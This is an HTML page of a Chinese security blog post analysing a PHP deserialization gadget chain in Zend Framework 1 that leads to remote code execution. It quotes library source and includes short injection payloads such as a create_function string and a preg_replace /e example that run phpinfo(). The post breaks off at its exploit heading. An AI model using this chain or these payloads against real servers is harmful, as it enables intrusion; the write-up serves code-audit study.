@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Zend FrameWork RCE1 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Zend FrameWork RCE1</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-07-20 02:09:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="准备"><a class="markdownIt-Anchor" href="#准备">#</a> 准备</h3>
+<p>在 bin 目录执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zf create prooject web1</span><br></pre></td></tr></table></figure>
+<p>在 <code>application\controllers\IndexController.php</code>  写入反序列化接收的参数</p>
+<p><img src="https://img-blog.csdnimg.cn/cca4a5cdc2a34ef28713b0f9c22aee03.png" alt="在这里插入图片描述"></p>
+<h3 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计">#</a> 代码审计</h3>
+<p><code>library\Zend\Log.php</code>  中的 <code>__destruct</code></p>
+<p><img src="https://img-blog.csdnimg.cn/a0c65f2d77da42f7b93000dbbb3d6c0a.png" alt="在这里插入图片描述"></p>
+<p>这里对_writers (私有的数组变量) 遍历并调用 shutdown 函数</p>
+<p>这里直接跟进会发现其调用的是 <code>Abstract.php</code>  下的 shutdown 无参方法</p>
+<p><img src="https://img-blog.csdnimg.cn/fcfd57a30e234d56bac660defc78f056.png" alt="在这里插入图片描述"></p>
+<p>没法继续向下跟进</p>
+<p>所以需要找其他的 shutdown 方法</p>
+<p>这里找到 <code>Zend_Log_Writer_Mail</code>  这个类的 <code>shutdown()</code></p>
+<p><img src="https://img-blog.csdnimg.cn/4881cfbf2fda459bbcacdf7843096e47.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// If there are events to mail, use them as message body.  Otherwise,</span></span><br><span class="line">        <span class="comment">// there is no mail to be sent.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;_eventsToMail)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_subjectPrependText !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Tack on the summary of entries per-priority to the subject</span></span><br><span class="line">            <span class="comment">// line and set it on the Zend_Mail object.</span></span><br><span class="line">            <span class="variable">$numEntries</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_getFormattedNumEntriesPerPriority</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_mail-&gt;<span class="title function_ invoke__">setSubject</span>(</span><br><span class="line">                <span class="string">&quot;<span class="subst">&#123;$this-&gt;_subjectPrependText&#125;</span> (<span class="subst">&#123;$numEntries&#125;</span>)&quot;</span>);</span><br><span class="line">        &#125;                                    </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Always provide events to mail as plaintext.</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_mail-&gt;<span class="title function_ invoke__">setBodyText</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;_eventsToMail));</span><br><span class="line">        <span class="comment">// If a Zend_Layout instance is being used, set its &quot;events&quot;</span></span><br><span class="line">        <span class="comment">// value to the lines formatted for use with the layout.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_layout) &#123;</span><br><span class="line">            <span class="comment">// Set the required &quot;messages&quot; value for the layout.  Here we</span></span><br><span class="line">            <span class="comment">// are assuming that the layout is for use with HTML.</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_layout-&gt;events =</span><br><span class="line">                <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;_layoutEventsToMail);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If an exception occurs during rendering, convert it to a notice</span></span><br><span class="line">            <span class="comment">// so we can avoid an exception thrown without a stack frame.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;_mail-&gt;<span class="title function_ invoke__">setBodyHtml</span>(<span class="variable">$this</span>-&gt;_layout-&gt;<span class="title function_ invoke__">render</span>());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">trigger_error</span>(</span><br><span class="line">                    <span class="string">&quot;exception occurred when rendering layout; &quot;</span> .</span><br><span class="line">                        <span class="string">&quot;unable to set html body for message; &quot;</span> .</span><br><span class="line">                        <span class="string">&quot;message = <span class="subst">&#123;$e-&gt;getMessage()&#125;</span>; &quot;</span> .</span><br><span class="line">                        <span class="string">&quot;code = <span class="subst">&#123;$e-&gt;getCode()&#125;</span>; &quot;</span> .</span><br><span class="line">                        <span class="string">&quot;exception class = &quot;</span> . <span class="title function_ invoke__">get_class</span>(<span class="variable">$e</span>),</span><br><span class="line">                    E_USER_NOTICE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>前两个 if 不为空即可</p>
+<p>按照定义</p>
+<p><img src="https://img-blog.csdnimg.cn/cf4a03b2f5024d86b926271680b9a4c0.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;_mail     =&gt;     <span class="variable language_">$this</span>-&gt;_mail = <span class="keyword">new</span> <span class="title class_">Zend_Mail</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;_layout   =&gt;     <span class="variable language_">$this</span>-&gt;_layout = <span class="keyword">new</span> <span class="title class_">Zend_Layout</span>();</span><br></pre></td></tr></table></figure>
+<p>之后进入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;_mail-&gt;<span class="title function_ invoke__">setBodyHtml</span>(<span class="variable">$this</span>-&gt;_layout-&gt;<span class="title function_ invoke__">render</span>());</span><br></pre></td></tr></table></figure>
+<p>跟进 render</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getLayout</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">inflectorEnabled</span>() &amp;&amp; (<span class="literal">null</span> !== (<span class="variable">$inflector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getInflector</span>())))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;_inflector-&gt;<span class="title function_ invoke__">filter</span>(<span class="keyword">array</span>(<span class="string">&#x27;script&#x27;</span> =&gt; <span class="variable">$name</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$view</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getView</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> !== (<span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getViewScriptPath</span>())) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$view</span>, <span class="string">&#x27;addScriptPath&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">addScriptPath</span>(<span class="variable">$path</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">setScriptPath</span>(<span class="variable">$path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">null</span> !== (<span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getViewBasePath</span>())) &#123;</span><br><span class="line">            <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">addBasePath</span>(<span class="variable">$path</span>, <span class="variable">$this</span>-&gt;_viewBasePrefix);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第二个 if 满足的两个条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">inflectorEnabled</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_inflectorEnabled;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInflector</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="variable language_">$this</span>-&gt;_inflector) &#123;</span><br><span class="line">            <span class="keyword">require_once</span> <span class="string">&#x27;Zend/Filter/Inflector.php&#x27;</span>;</span><br><span class="line">            <span class="variable">$inflector</span> = <span class="keyword">new</span> <span class="title class_">Zend_Filter_Inflector</span>();</span><br><span class="line">            <span class="variable">$inflector</span>-&gt;<span class="title function_ invoke__">setTargetReference</span>(<span class="variable">$this</span>-&gt;_inflectorTarget)</span><br><span class="line">                      -&gt;<span class="title function_ invoke__">addRules</span>(<span class="keyword">array</span>(<span class="string">&#x27;:script&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;Word_CamelCaseToDash&#x27;</span>, <span class="string">&#x27;StringToLower&#x27;</span>)))</span><br><span class="line">                      -&gt;<span class="title function_ invoke__">setStaticRuleReference</span>(<span class="string">&#x27;suffix&#x27;</span>, <span class="variable">$this</span>-&gt;_viewSuffix);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setInflector</span>(<span class="variable">$inflector</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_inflector;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>第一个好说，设置为 true</p>
+<p>第二个保证 <code>$this-&gt;_inflector</code>  不为空即可</p>
+<p>由于 <code>$this-&gt;_inflector</code>  是可控的，所以我们</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;_inflector-&gt;<span class="title function_ invoke__">filter</span>(<span class="keyword">array</span>(<span class="string">&#x27;script&#x27;</span> =&gt; <span class="variable">$name</span>));</span><br></pre></td></tr></table></figure>
+<p>可以调用任意类的 filter 方法</p>
+<p>这里找到三个地方</p>
+<p><code>Inflector</code>  ， <code>PregReplace</code>  和 <code>Callback</code>  中都有 filter 方法</p>
+<p>跟进到 <code>Inflector</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$source</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// clean source</span></span><br><span class="line">        <span class="keyword">foreach</span> ( (<span class="keyword">array</span>) <span class="variable">$source</span> <span class="keyword">as</span> <span class="variable">$sourceName</span> =&gt; <span class="variable">$sourceValue</span>) &#123;</span><br><span class="line">            <span class="variable">$source</span>[<span class="title function_ invoke__">ltrim</span>(<span class="variable">$sourceName</span>, <span class="string">&#x27;:&#x27;</span>)] = <span class="variable">$sourceValue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pregQuotedTargetReplacementIdentifier</span> = <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$this</span>-&gt;_targetReplacementIdentifier, <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">        <span class="variable">$processedParts</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_rules <span class="keyword">as</span> <span class="variable">$ruleName</span> =&gt; <span class="variable">$ruleValue</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$source</span>[<span class="variable">$ruleName</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ruleValue</span>)) &#123;</span><br><span class="line">                    <span class="comment">// overriding the set rule</span></span><br><span class="line">                    <span class="variable">$processedParts</span>[<span class="string">&#x27;#&#x27;</span>.<span class="variable">$pregQuotedTargetReplacementIdentifier</span>.<span class="variable">$ruleName</span>.<span class="string">&#x27;#&#x27;</span>] = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="variable">$source</span>[<span class="variable">$ruleName</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$ruleValue</span>)) &#123;</span><br><span class="line">                    <span class="variable">$processedPart</span> = <span class="variable">$source</span>[<span class="variable">$ruleName</span>];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$ruleValue</span> <span class="keyword">as</span> <span class="variable">$ruleFilter</span>) &#123;</span><br><span class="line">                        <span class="variable">$processedPart</span> = <span class="variable">$ruleFilter</span>-&gt;<span class="title function_ invoke__">filter</span>(<span class="variable">$processedPart</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$processedParts</span>[<span class="string">&#x27;#&#x27;</span>.<span class="variable">$pregQuotedTargetReplacementIdentifier</span>.<span class="variable">$ruleName</span>.<span class="string">&#x27;#&#x27;</span>] = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="variable">$processedPart</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ruleValue</span>)) &#123;</span><br><span class="line">                <span class="variable">$processedParts</span>[<span class="string">&#x27;#&#x27;</span>.<span class="variable">$pregQuotedTargetReplacementIdentifier</span>.<span class="variable">$ruleName</span>.<span class="string">&#x27;#&#x27;</span>] = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="variable">$ruleValue</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// all of the values of processedParts would have been str_replace(&#x27;\\&#x27;, &#x27;\\\\&#x27;, ..)&#x27;d to disable preg_replace backreferences</span></span><br><span class="line">        <span class="variable">$inflectedTarget</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$processedParts</span>), <span class="title function_ invoke__">array_values</span>(<span class="variable">$processedParts</span>), <span class="variable">$this</span>-&gt;_target);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_throwTargetExceptionsOn &amp;&amp; (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#(?=&#x27;</span>.<span class="variable">$pregQuotedTargetReplacementIdentifier</span>.<span class="string">&#x27;[A-Za-z]&#123;1&#125;)#&#x27;</span>, <span class="variable">$inflectedTarget</span>) == <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">require_once</span> <span class="string">&#x27;Zend/Filter/Exception.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Zend_Filter_Exception</span>(<span class="string">&#x27;A replacement identifier &#x27;</span> . <span class="variable language_">$this</span>-&gt;_targetReplacementIdentifier . <span class="string">&#x27; was found inside the inflected target, perhaps a rule was not satisfied with a target source?  Unsatisfied inflected target: &#x27;</span> . <span class="variable">$inflectedTarget</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$inflectedTarget</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里的 preg_replace 的三个参数都可控</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$inflectedTarget</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$processedParts</span>), <span class="title function_ invoke__">array_values</span>(<span class="variable">$processedParts</span>), <span class="variable">$this</span>-&gt;_target);</span><br></pre></td></tr></table></figure>
+<p>结合着</p>
+<p><code>Callback</code>  中的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_options !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;_options)) &#123;</span><br><span class="line">                <span class="variable">$options</span> = <span class="keyword">array</span>(<span class="variable language_">$this</span>-&gt;_options);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;_options;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$options</span>, <span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;_callback, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以实现 <code>call_user_func_array('create_function',[&quot;)&#123;&#125;phpinfo();exit;/*&quot;,'']);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;create_function&#x27;</span>,[<span class="string">&quot;)&#123;&#125;phpinfo();exit;/*&quot;</span>,<span class="string">&#x27;&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>实际上也就是实现了 phpinfo ()</p>
+<p><img src="https://img-blog.csdnimg.cn/32e97c875ad24f16bf6f32f2731f9c4c.png" alt="在这里插入图片描述"></p>
+<p>上面提到的还有一个没有利用的 filter 方法</p>
+<p><code>Preg_Replace</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_matchPattern == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">require_once</span> <span class="string">&#x27;Zend/Filter/Exception.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Zend_Filter_Exception</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>) . <span class="string">&#x27; does not have a valid MatchPattern set.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$this</span>-&gt;_matchPattern, <span class="variable">$this</span>-&gt;_replacement, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure>
+<p>这里的前两个值是可控的，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557#toc-1">深入研究 preg_replace 与代码执行 - 先知社区 (aliyun.com)</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">变成了语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;);</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h3>
